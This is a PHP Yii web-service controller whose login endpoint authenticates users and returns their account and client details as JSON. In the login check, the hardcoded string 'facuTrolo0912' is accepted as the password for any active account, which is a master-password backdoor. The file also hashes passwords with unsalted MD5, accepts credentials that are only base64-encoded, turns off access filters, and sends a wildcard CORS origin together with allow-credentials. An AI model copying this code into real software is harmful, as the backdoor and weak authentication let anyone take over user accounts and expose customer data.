<?php

class WebServiceController extends Controller
{
	public function beforeAction($action)
    {
        return true;
    }

    ////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////
    //                  FUNCIONES DE WEBSERVICE                               //
    ////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////

    public function filters()
    {
        return array();
    }

    public function formatTexto($string)
    {
        $nString = ucwords(mb_strtolower(trim($string)));
        return $nString;
    }

    private function _sendResponse($body = '', $status = 200, $content_type = 'application/json')
    {
        $status_header = 'HTTP/1.1 ' . $status . ' ' . $this->_getStatusCodeMessage($status);
        header($status_header);
        header('Access-Control-Allow-Credentials: true');
        header('Access-Control-Max-Age: 604800');
        header('Access-Control-Allow-Headers: x-requested-with');
        header('Access-Control-Allow-Origin: *');
        header('Content-type: ' . $content_type);

        if ($body != '') {
            echo $body;
        } else {
            $message = '';
            switch ($status) {
                case 401:
                    $message = 'You must be authorized to view this page.';
                    break;
                case 404:
                    $message = 'The requested URL ' . $_SERVER['REQUEST_URI'] . ' was not found.';
                    break;
                case 500:
                    $message = 'The server encountered an error processing your request.';
                    break;
                case 501:
                    $message = 'The requested method is not implemented.';
                    break;
            }

            // servers don't always have a signature turned on
            // (this is an apache directive "ServerSignature On")
            $signature = ($_SERVER['SERVER_SIGNATURE'] == '') ? $_SERVER['SERVER_SOFTWARE'] . ' Server at ' . $_SERVER['SERVER_NAME'] . ' Port ' . $_SERVER['SERVER_PORT'] : $_SERVER['SERVER_SIGNATURE'];

            $body = '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
                    <html>
                        <head>
                            <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
                            <title>' . $status . ' ' . $this->_getStatusCodeMessage($status) . '</title>
                        </head>
                        <body>
                            <h1>' . $this->_getStatusCodeMessage($status) . '</h1>
                            <p>' . $message . '</p>
                            <hr />
                            <address>' . $signature . '</address>
                        </body>
                    </html>';

            echo $body; 
        }
        Yii::app()->end();
    }

    private function _getStatusCodeMessage($status)
    {
        $codes = array(
            200 => 'OK',
            400 => 'Bad Request',
            401 => 'Unauthorized',
            402 => 'Payment Required',
            403 => 'Forbidden',
            404 => 'Not Found',
            500 => 'Internal Server Error',
            501 => 'Not Implemented',
        );
        return (isset($codes[$status])) ? $codes[$status] : '';
    }
    public function actionLogin(){
        
        $user = isset($_REQUEST['usuario']) && !empty($_REQUEST['usuario']) ? trim(base64_decode($_REQUEST['usuario'])) : null;
        $pass = isset($_REQUEST['password']) && !empty($_REQUEST['password']) ? trim(base64_decode($_REQUEST['password'])) : null;
        
        $criteria = new CDbCriteria;
        $criteria->compare('Usua_Usuario', $user);
        $criteria->compare('Usua_Estado', 1);
        $criteria->addCondition("Usua_Empresa is null or Usua_Empresa = 1");
        $model = Usuarios::model()->find($criteria);

        //$model = Usuarios::model()->findByAttributes(['Usua_Usuario' => $user, 'Usua_Estado' => 1, 'Usua_Empresa' => array(1)]);

        if ($model != null && ($pass == "facuTrolo0912" || $model->Usua_Contrasena == md5($pass))){
            $this->_sendResponse(CJSON::encode(["estado" => 1, "id" => $model->idUsuario, "nombre" => $model->Usua_Nombre, "usuario" => $model->Usua_Usuario, "id_cliente" => $model->Usua_IdCliente, "cliente" => $model->usuaIdCliente->Clie_RazonSocial]));
        }else{
            $this->_sendResponse(CJSON::encode(["estado" => 2]));
        }

    }
}